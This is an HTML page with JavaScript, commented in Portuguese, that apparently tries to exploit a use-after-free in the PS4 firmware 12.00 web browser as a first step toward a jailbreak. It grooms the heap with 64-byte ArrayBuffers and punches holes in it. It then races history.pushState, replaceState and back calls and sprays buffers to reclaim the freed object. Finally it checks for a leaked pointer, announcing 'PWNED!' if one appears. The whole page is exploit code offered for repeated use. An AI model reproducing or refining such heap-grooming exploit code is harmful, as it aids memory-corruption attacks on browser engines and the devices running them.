<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - The "Lucky 64" Strategy</title>
<style>
    body { background-color: #101010; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
    button { padding: 20px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #004400; color: #fff; margin-bottom: 10px; }
    #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; background-color: #000; }
    .success { background-color: #fff; color: #000; font-weight: bold; border: 5px solid #0f0; }
    .partial { background-color: #ff0; color: #000; font-weight: bold; border: 5px solid #ff0; }
</style>
</head>
<body>
<h2>PS4 12.00 - Replicando o Sucesso "CCCC"</h2>
<div id="status">Estratégia: Loop 48 + Timeout + ArrayBuffer(64)</div>
<button onclick="runLucky64()">TENTAR REPRODUZIR SUCESSO</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Configuração baseada no seu sucesso anterior
const BUFFER_SIZE = 64; 
const MARKER = 0x41414141; // AAAA

var keepAlive = [];
var targetViews = []; // Para checar vazamento de memória

async function runLucky64() {
    logEl.textContent = "";
    keepAlive = [];
    targetViews = [];
    statusEl.textContent = "Preparando...";

    // 1. GROOMING (Igual ao teste do Bucket Shotgun)
    log("1. Alocando 1500 buffers de 64 bytes...");
    for(let i=0; i<1500; i++) {
        let buf = new ArrayBuffer(BUFFER_SIZE);
        let view = new Uint32Array(buf);
        view.fill(MARKER);
        keepAlive.push(buf);
        // Guardamos algumas views para verificar escrita (LEAK)
        if(i % 2 === 0) targetViews.push(view);
    }
    
    // Swiss Cheese (Buracos para o UAF cair)
    log("   -> Criando buracos (1 a cada 4)...");
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // 2. TRIGGER UAF (Loop 48 - O Clássico)
    log("2. Iniciando Loop UAF...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        // Gatilho via Timeout (Como no teste CCCC)
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // JANELA CRÍTICA
        if (i === 47) {
            log(">>> [MOMENTO CRÍTICO] SPRAY <<<");
            
            // Libera o HistoryItem
            setTimeout(() => history.back(), 0);
            
            // Spray Massivo de 64 bytes
            // Tentamos ser rápidos para pegar a vaga
            for(let k=0; k<800; k++) {
                let buf = new ArrayBuffer(BUFFER_SIZE);
                let view = new Uint32Array(buf);
                view.fill(MARKER);
                keepAlive.push(buf);
                targetViews.push(view);
            }
        }
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(300);

    // 3. ANÁLISE DUPLA (URL + BUFFER)
    log("3. Analisando resultados...");
    
    let url = document.URL;
    let urlChanged = false;
    let leakFound = false;
    let leakVal = "";

    // CHECK A: A URL mudou para 'AAAA'? (Sucesso anterior)
    if (url.indexOf("AAAA") !== -1) {
        urlChanged = true;
        log("!!! SINAL POSITIVO: URL CONTÉM 'AAAA' !!!");
        log("Isso confirma que ocupamos o objeto (FakeObj).");
    }

    // CHECK B: Algum buffer mudou de valor? (O que precisamos para Jailbreak)
    for(let i=0; i < targetViews.length; i++) {
        let view = targetViews[i];
        if(view[0] !== MARKER) {
            leakFound = true;
            leakVal = "0x" + view[0].toString(16).padStart(8,'0');
            log(`!!! LEAK DETECTADO NO BUFFER ${i} !!!`);
            log(`Valor: ${leakVal}`);
            break;
        }
    }

    // RESULTADO
    if (leakFound) {
        statusEl.className = "success";
        statusEl.textContent = `PWNED! POINTER LEAK: ${leakVal}`;
        log("\nCONCLUSÃO: TEMOS UM PONTEIRO! SALVE ESSE VALOR.");
    } else if (urlChanged) {
        statusEl.className = "partial";
        statusEl.textContent = "SUCESSO PARCIAL (FakeObj)";
        log("\nCONCLUSÃO: Controlamos o objeto, mas o navegador não escreveu nele.");
        log("Estamos no caminho certo. Tente novamente para conseguir o Leak.");
    } else {
        log("Falha: Ainda 'V'. A Race Condition não bateu.");
        log("Sugestão: Tente clicar no botão novamente. O heap muda a cada tentativa.");
    }
}
</script>
</body>
</html>
